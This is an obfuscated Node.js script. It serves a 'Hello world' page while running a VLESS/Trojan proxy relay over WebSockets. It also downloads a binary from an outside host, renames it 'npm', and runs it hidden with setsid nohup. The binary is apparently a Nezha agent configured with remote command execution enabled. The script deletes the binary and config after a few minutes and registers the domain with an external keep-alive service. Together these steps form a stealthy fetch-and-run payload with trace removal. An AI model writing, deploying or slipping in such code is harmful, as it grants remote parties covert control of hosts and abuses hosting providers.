function _0x2fcd(_0x3d7105,_0x37835e){const _0x49dbbe=_0x49db();return _0x2fcd=function(_0x2fcd4e,_0x59f7fe){_0x2fcd4e=_0x2fcd4e-0x197;let _0x1bd5c6=_0x49dbbe[_0x2fcd4e];return _0x1bd5c6;},_0x2fcd(_0x3d7105,_0x37835e);}const _0x2843f6=_0x2fcd;(function(_0xacdfce,_0x449d6a){const _0x3a96de=_0x2fcd,_0x2546f6=_0xacdfce();while(!![]){try{const _0x2b2546=parseInt(_0x3a96de(0x1d3))/0x1*(parseInt(_0x3a96de(0x205))/0x2)+parseInt(_0x3a96de(0x20c))/0x3*(parseInt(_0x3a96de(0x201))/0x4)+parseInt(_0x3a96de(0x1ab))/0x5*(parseInt(_0x3a96de(0x1ef))/0x6)+parseInt(_0x3a96de(0x1f8))/0x7*(parseInt(_0x3a96de(0x1ba))/0x8)+parseInt(_0x3a96de(0x1c0))/0x9+-parseInt(_0x3a96de(0x1cb))/0xa*(parseInt(_0x3a96de(0x206))/0xb)+-parseInt(_0x3a96de(0x1f7))/0xc*(parseInt(_0x3a96de(0x1ec))/0xd);if(_0x2b2546===_0x449d6a)break;else _0x2546f6['push'](_0x2546f6['shift']());}catch(_0x45b0c9){_0x2546f6['push'](_0x2546f6['shift']());}}}(_0x49db,0x1b6f4));const os=require('os'),http=require(_0x2843f6(0x1ae)),fs=require('fs'),axios=require(_0x2843f6(0x1dc)),net=require(_0x2843f6(0x1b5)),path=require(_0x2843f6(0x208)),crypto=require(_0x2843f6(0x202)),{Buffer}=require(_0x2843f6(0x1c3)),{exec,execSync}=require(_0x2843f6(0x1bf)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x2843f6(0x1d7)][_0x2843f6(0x1a9)]||_0x2843f6(0x1fc),NEZHA_SERVER=process[_0x2843f6(0x1d7)][_0x2843f6(0x209)]||'',NEZHA_PORT=process['env'][_0x2843f6(0x1c7)]||'',NEZHA_KEY=process['env'][_0x2843f6(0x1f4)]||'',DOMAIN=process[_0x2843f6(0x1d7)][_0x2843f6(0x1ea)]||_0x2843f6(0x20e),AUTO_ACCESS=process['env'][_0x2843f6(0x1db)]||!![],WSPATH=process[_0x2843f6(0x1d7)][_0x2843f6(0x1b8)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x2843f6(0x1d7)][_0x2843f6(0x1a1)]||_0x2843f6(0x217),NAME=process[_0x2843f6(0x1d7)][_0x2843f6(0x1c2)]||'',PORT=process['env'][_0x2843f6(0x1da)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x490d92=_0x2843f6;try{const _0x31dc04=await axios[_0x490d92(0x1f0)]('https://api.ip.sb/geoip'),_0xc2647c=_0x31dc04['data'];ISP=(_0xc2647c[_0x490d92(0x204)]+'-'+_0xc2647c['isp'])['replace'](/ /g,'_');}catch(_0x4a0a89){ISP=_0x490d92(0x1f3);}};GetISP();const httpServer=http[_0x2843f6(0x1c9)]((_0x447f21,_0xd89ead)=>{const _0x38567a=_0x2843f6;if(_0x447f21[_0x38567a(0x1bd)]==='/'){const _0x54e496=path[_0x38567a(0x1d0)](__dirname,_0x38567a(0x1be));fs[_0x38567a(0x212)](_0x54e496,_0x38567a(0x1cc),(_0x773e26,_0x2a3c8e)=>{const _0x37a8a3=_0x38567a;if(_0x773e26){_0xd89ead['writeHead'](0xc8,{'Content-Type':_0x37a8a3(0x1e6)}),_0xd89ead[_0x37a8a3(0x1cd)](_0x37a8a3(0x1cf));return;}_0xd89ead[_0x37a8a3(0x1e4)](0xc8,{'Content-Type':'text/html'}),_0xd89ead[_0x37a8a3(0x1cd)](_0x2a3c8e);});return;}else{if(_0x447f21[_0x38567a(0x1bd)]==='/'+SUB_PATH){const _0x419d1f=NAME?NAME+'-'+ISP:ISP,_0x596da9=_0x38567a(0x214)+UUID+'@'+DOMAIN+_0x38567a(0x1bb)+DOMAIN+_0x38567a(0x1bc)+DOMAIN+_0x38567a(0x1fe)+WSPATH+'#'+_0x419d1f,_0x323e00='trojan://'+UUID+'@'+DOMAIN+_0x38567a(0x1de)+DOMAIN+_0x38567a(0x1bc)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x419d1f,_0x7508e7=_0x596da9+'\x0a'+_0x323e00,_0x37bf4d=Buffer[_0x38567a(0x1e9)](_0x7508e7)[_0x38567a(0x1d1)](_0x38567a(0x210));_0xd89ead[_0x38567a(0x1e4)](0xc8,{'Content-Type':'text/plain'}),_0xd89ead[_0x38567a(0x1cd)](_0x37bf4d+'\x0a');}else _0xd89ead[_0x38567a(0x1e4)](0x194,{'Content-Type':'text/plain'}),_0xd89ead[_0x38567a(0x1cd)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x2843f6(0x19a))]({'server':httpServer}),uuid=UUID[_0x2843f6(0x19d)](/-/g,''),DNS_SERVERS=[_0x2843f6(0x1af),_0x2843f6(0x1d5)];function resolveHost(_0x29b93d){return new Promise((_0x56104e,_0x4cfd50)=>{const _0x30e59d=_0x2fcd;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x30e59d(0x1f1)](_0x29b93d)){_0x56104e(_0x29b93d);return;}let _0x4c5651=0x0;function _0x5612ce(){const _0xa20ce9=_0x30e59d;if(_0x4c5651>=DNS_SERVERS[_0xa20ce9(0x1df)]){_0x4cfd50(new Error('Failed\x20to\x20resolve\x20'+_0x29b93d+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x598849=DNS_SERVERS[_0x4c5651];_0x4c5651++;const _0x3accc9=_0xa20ce9(0x1aa)+encodeURIComponent(_0x29b93d)+_0xa20ce9(0x1c5);axios[_0xa20ce9(0x1f0)](_0x3accc9,{'timeout':0x1388,'headers':{'Accept':_0xa20ce9(0x1ac)}})['then'](_0x22958e=>{const _0x1c437e=_0xa20ce9,_0x241461=_0x22958e[_0x1c437e(0x1ce)];if(_0x241461['Status']===0x0&&_0x241461[_0x1c437e(0x1b4)]&&_0x241461['Answer'][_0x1c437e(0x1df)]>0x0){const _0xfcbcf5=_0x241461[_0x1c437e(0x1b4)][_0x1c437e(0x203)](_0x22812c=>_0x22812c[_0x1c437e(0x1fb)]===0x1);if(_0xfcbcf5){_0x56104e(_0xfcbcf5[_0x1c437e(0x1ce)]);return;}}_0x5612ce();})[_0xa20ce9(0x19c)](_0x2c926f=>{_0x5612ce();});}_0x5612ce();});}function handleVlessConnection(_0x12c559,_0x5aff0d){const _0x466520=_0x2843f6,[_0x2ca2c1]=_0x5aff0d,_0x2b3249=_0x5aff0d[_0x466520(0x1d6)](0x1,0x11);if(!_0x2b3249[_0x466520(0x1a3)]((_0x11bfbf,_0xa7a267)=>_0x11bfbf==parseInt(uuid['substr'](_0xa7a267*0x2,0x2),0x10)))return![];let _0x341532=_0x5aff0d[_0x466520(0x1d6)](0x11,0x12)['readUInt8']()+0x13;const _0x9a91e9=_0x5aff0d[_0x466520(0x1d6)](_0x341532,_0x341532+=0x2)[_0x466520(0x1ff)](0x0),_0x2ffbbb=_0x5aff0d['slice'](_0x341532,_0x341532+=0x1)[_0x466520(0x20d)](),_0x296f2a=_0x2ffbbb==0x1?_0x5aff0d[_0x466520(0x1d6)](_0x341532,_0x341532+=0x4)[_0x466520(0x1d0)]('.'):_0x2ffbbb==0x2?new TextDecoder()[_0x466520(0x1a0)](_0x5aff0d[_0x466520(0x1d6)](_0x341532+0x1,_0x341532+=0x1+_0x5aff0d[_0x466520(0x1d6)](_0x341532,_0x341532+0x1)['readUInt8']())):_0x2ffbbb==0x3?_0x5aff0d['slice'](_0x341532,_0x341532+=0x10)[_0x466520(0x1f9)]((_0x451747,_0x40e5ff,_0x17ef01,_0x16910e)=>_0x17ef01%0x2?_0x451747[_0x466520(0x19f)](_0x16910e[_0x466520(0x1d6)](_0x17ef01-0x1,_0x17ef01+0x1)):_0x451747,[])['map'](_0x43541f=>_0x43541f[_0x466520(0x1ff)](0x0)[_0x466520(0x1d1)](0x10))[_0x466520(0x1d0)](':'):'';_0x12c559[_0x466520(0x1fd)](new Uint8Array([_0x2ca2c1,0x0]));const _0x29ef06=createWebSocketStream(_0x12c559);return resolveHost(_0x296f2a)[_0x466520(0x1e3)](_0x47babc=>{const _0x2d30a8=_0x466520;net[_0x2d30a8(0x19b)]({'host':_0x47babc,'port':_0x9a91e9},function(){const _0x506787=_0x2d30a8;this['write'](_0x5aff0d[_0x506787(0x1d6)](_0x341532)),_0x29ef06['on'](_0x506787(0x199),()=>{})[_0x506787(0x1c1)](this)['on']('error',()=>{})[_0x506787(0x1c1)](_0x29ef06);})['on'](_0x2d30a8(0x199),()=>{});})[_0x466520(0x19c)](_0x2fe292=>{const _0x5dc19d=_0x466520;net[_0x5dc19d(0x19b)]({'host':_0x296f2a,'port':_0x9a91e9},function(){const _0x5773a8=_0x5dc19d;this[_0x5773a8(0x1a7)](_0x5aff0d[_0x5773a8(0x1d6)](_0x341532)),_0x29ef06['on']('error',()=>{})[_0x5773a8(0x1c1)](this)['on'](_0x5773a8(0x199),()=>{})['pipe'](_0x29ef06);})['on'](_0x5dc19d(0x199),()=>{});}),!![];}function handleTrojanConnection(_0x46b9a,_0x283e58){const _0xa1a8b4=_0x2843f6;try{if(_0x283e58[_0xa1a8b4(0x1df)]<0x3a)return![];const _0x5cfb0d=_0x283e58['slice'](0x0,0x38)['toString'](),_0x400b57=[UUID];let _0x24e00a=null;for(const _0x51db6d of _0x400b57){const _0x42d879=crypto[_0xa1a8b4(0x20a)](_0xa1a8b4(0x1b3))[_0xa1a8b4(0x1ad)](_0x51db6d)[_0xa1a8b4(0x1e8)](_0xa1a8b4(0x1ed));if(_0x42d879===_0x5cfb0d){_0x24e00a=_0x51db6d;break;}}if(!_0x24e00a)return![];let _0x70e164=0x38;_0x283e58[_0x70e164]===0xd&&_0x283e58[_0x70e164+0x1]===0xa&&(_0x70e164+=0x2);const _0x4ed056=_0x283e58[_0x70e164];if(_0x4ed056!==0x1)return![];_0x70e164+=0x1;const _0x5f1eb1=_0x283e58[_0x70e164];_0x70e164+=0x1;let _0x2928fb,_0x25d53b;if(_0x5f1eb1===0x1)_0x2928fb=_0x283e58[_0xa1a8b4(0x1d6)](_0x70e164,_0x70e164+0x4)['join']('.'),_0x70e164+=0x4;else{if(_0x5f1eb1===0x3){const _0x36b349=_0x283e58[_0x70e164];_0x70e164+=0x1,_0x2928fb=_0x283e58[_0xa1a8b4(0x1d6)](_0x70e164,_0x70e164+_0x36b349)[_0xa1a8b4(0x1d1)](),_0x70e164+=_0x36b349;}else{if(_0x5f1eb1===0x4)_0x2928fb=_0x283e58[_0xa1a8b4(0x1d6)](_0x70e164,_0x70e164+0x10)['reduce']((_0x35f182,_0x314a73,_0x1357c6,_0x172091)=>_0x1357c6%0x2?_0x35f182['concat'](_0x172091[_0xa1a8b4(0x1d6)](_0x1357c6-0x1,_0x1357c6+0x1)):_0x35f182,[])[_0xa1a8b4(0x1f2)](_0x286cc7=>_0x286cc7[_0xa1a8b4(0x1ff)](0x0)[_0xa1a8b4(0x1d1)](0x10))[_0xa1a8b4(0x1d0)](':'),_0x70e164+=0x10;else return![];}}_0x25d53b=_0x283e58[_0xa1a8b4(0x1ff)](_0x70e164),_0x70e164+=0x2;_0x70e164<_0x283e58['length']&&_0x283e58[_0x70e164]===0xd&&_0x283e58[_0x70e164+0x1]===0xa&&(_0x70e164+=0x2);const _0x4dd2c6=createWebSocketStream(_0x46b9a);return resolveHost(_0x2928fb)['then'](_0x342c32=>{net['connect']({'host':_0x342c32,'port':_0x25d53b},function(){const _0x30c46a=_0x2fcd;_0x70e164<_0x283e58[_0x30c46a(0x1df)]&&this[_0x30c46a(0x1a7)](_0x283e58[_0x30c46a(0x1d6)](_0x70e164)),_0x4dd2c6['on']('error',()=>{})['pipe'](this)['on'](_0x30c46a(0x199),()=>{})[_0x30c46a(0x1c1)](_0x4dd2c6);})['on']('error',()=>{});})[_0xa1a8b4(0x19c)](_0x278660=>{const _0x2b8d2a=_0xa1a8b4;net[_0x2b8d2a(0x19b)]({'host':_0x2928fb,'port':_0x25d53b},function(){const _0x575afc=_0x2b8d2a;_0x70e164<_0x283e58[_0x575afc(0x1df)]&&this[_0x575afc(0x1a7)](_0x283e58[_0x575afc(0x1d6)](_0x70e164)),_0x4dd2c6['on']('error',()=>{})[_0x575afc(0x1c1)](this)['on']('error',()=>{})[_0x575afc(0x1c1)](_0x4dd2c6);})['on'](_0x2b8d2a(0x199),()=>{});}),!![];}catch(_0x25f31d){return![];}}wss['on']('connection',(_0x506460,_0x2dfdb6)=>{const _0x484d15=_0x2843f6,_0x59f0e7=_0x2dfdb6[_0x484d15(0x1bd)]||'';_0x506460[_0x484d15(0x1e7)](_0x484d15(0x1ca),_0x1857c6=>{const _0x224e35=_0x484d15;if(_0x1857c6[_0x224e35(0x1df)]>0x11&&_0x1857c6[0x0]===0x0){const _0xba1ba1=_0x1857c6['slice'](0x1,0x11),_0x35cf94=_0xba1ba1[_0x224e35(0x1a3)]((_0x3d842d,_0x555cc3)=>_0x3d842d==parseInt(uuid[_0x224e35(0x1c4)](_0x555cc3*0x2,0x2),0x10));if(_0x35cf94){!handleVlessConnection(_0x506460,_0x1857c6)&&_0x506460['close']();return;}}!handleTrojanConnection(_0x506460,_0x1857c6)&&_0x506460[_0x224e35(0x1c6)]();})['on'](_0x484d15(0x199),()=>{});});const getDownloadUrl=()=>{const _0x511253=_0x2843f6,_0x1277f5=os[_0x511253(0x1eb)]();return _0x1277f5==='arm'||_0x1277f5==='arm64'||_0x1277f5===_0x511253(0x207)?!NEZHA_PORT?_0x511253(0x1e2):_0x511253(0x1e1):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x52baeb=_0x2843f6;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x450607=getDownloadUrl(),_0xd649ae=await axios({'method':'get','url':_0x450607,'responseType':_0x52baeb(0x1d4)}),_0x138461=fs['createWriteStream'](_0x52baeb(0x1a5));return _0xd649ae[_0x52baeb(0x1ce)][_0x52baeb(0x1c1)](_0x138461),new Promise((_0x3393ad,_0x292cff)=>{const _0x3eebdb=_0x52baeb;_0x138461['on'](_0x3eebdb(0x1b0),()=>{const _0x5cb045=_0x3eebdb;console[_0x5cb045(0x1b2)](_0x5cb045(0x20b)),exec('chmod\x20+x\x20npm',_0x401ddd=>{if(_0x401ddd)_0x292cff(_0x401ddd);_0x3393ad();});}),_0x138461['on'](_0x3eebdb(0x199),_0x292cff);});}catch(_0x539c07){throw _0x539c07;}},runnz=async()=>{const _0x3fa207=_0x2843f6;try{const _0x5a54c7=execSync(_0x3fa207(0x213),{'encoding':_0x3fa207(0x1a2)});if(_0x5a54c7[_0x3fa207(0x215)]()!==''){console['log'](_0x3fa207(0x1c8));return;}}catch(_0x36380e){}await downloadFile();let _0x5ece6f='',_0x4407c6=[_0x3fa207(0x198),_0x3fa207(0x1b7),_0x3fa207(0x1ee),_0x3fa207(0x200),'2083',_0x3fa207(0x1dd)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1ad5e7=_0x4407c6['includes'](NEZHA_PORT)?_0x3fa207(0x1d8):'';_0x5ece6f='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x3fa207(0x211)+NEZHA_KEY+'\x20'+_0x1ad5e7+_0x3fa207(0x20f);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x40bd71=NEZHA_SERVER[_0x3fa207(0x1d2)](':')?NEZHA_SERVER['split'](':')[_0x3fa207(0x1fa)]():'',_0x41ec3c=_0x4407c6[_0x3fa207(0x1d2)](_0x40bd71)?'true':'false',_0x25604c='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3fa207(0x1d9)+_0x41ec3c+_0x3fa207(0x1b6)+UUID;fs[_0x3fa207(0x1f6)](_0x3fa207(0x197),_0x25604c);}_0x5ece6f=_0x3fa207(0x1a8);}else{console[_0x3fa207(0x1b2)](_0x3fa207(0x1b9));return;}}try{exec(_0x5ece6f,{'shell':'/bin/bash'},_0x26ecbc=>{const _0x4e4fb5=_0x3fa207;if(_0x26ecbc)console['error'](_0x4e4fb5(0x1e5),_0x26ecbc);else console[_0x4e4fb5(0x1b2)]('npm\x20is\x20running');});}catch(_0x145499){console[_0x3fa207(0x199)](_0x3fa207(0x1e0)+_0x145499);}};async function addAccessTask(){const _0x28de42=_0x2843f6;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x93c437='https://'+DOMAIN;try{const _0x222b9d=await axios[_0x28de42(0x1f5)]('https://oooo.serv00.net/add-url',{'url':_0x93c437},{'headers':{'Content-Type':_0x28de42(0x216)}});console[_0x28de42(0x1b2)](_0x28de42(0x1b1));}catch(_0x1d116b){}}const delFiles=()=>{const _0x16a9b9=_0x2843f6;fs[_0x16a9b9(0x1a4)](_0x16a9b9(0x1a5),()=>{}),fs[_0x16a9b9(0x1a4)](_0x16a9b9(0x197),()=>{});};httpServer[_0x2843f6(0x19e)](PORT,()=>{const _0x1bd9f5=_0x2843f6;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1bd9f5(0x1b2)](_0x1bd9f5(0x1a6)+PORT);});function _0x49db(){const _0x5c210e=['--tls','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','PORT','AUTO_ACCESS','axios','2053',':443?security=tls&sni=','length','error:\x20','https://arm64.ssss.nyc.mn/agent','https://arm64.ssss.nyc.mn/v1','then','writeHead','npm\x20running\x20error:','text/html','once','digest','from','DOMAIN','arch','3019354HEawqd','hex','2096','30kMuxAG','get','test','map','Unknown','NEZHA_KEY','post','writeFileSync','12kEIEJJ','77qnmfda','reduce','pop','type','f8761d01-3df5-4b0a-9ef4-cf107db8addf','send','&path=%2F','readUInt16BE','2087','340edfpoR','crypto','find','country_code','934xknnnR','44ZahEBD','aarch64','path','NEZHA_SERVER','createHash','npm\x20download\x20successfully','3867UTdhjl','readUInt8','1234.abc.com','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','base64','\x20-p\x20','readFile','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','vless://','trim','application/json','sub','config.yaml','443','error','Server','connect','catch','replace','listen','concat','decode','SUB_PATH','utf-8','every','unlink','npm','Server\x20is\x20running\x20on\x20port\x20','write','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','UUID','https://dns.google/resolve?name=','80480QSwSaf','application/dns-json','update','http','8.8.4.4','finish','Automatic\x20Access\x20Task\x20added\x20successfully','log','sha224','Answer','net','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','8443','WSPATH','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','119592FRtUtr',':443?encryption=none&security=tls&sni=','&fp=chrome&type=ws&host=','url','index.html','child_process','287037XoXWSG','pipe','NAME','buffer','substr','&type=A','close','NEZHA_PORT','npm\x20is\x20already\x20running,\x20skip\x20running...','createServer','message','294670gKzAez','utf8','end','data','Hello\x20world!','join','toString','includes','163nsfCvU','stream','1.1.1.1','slice','env'];_0x49db=function(){return _0x5c210e;};return _0x49db();}
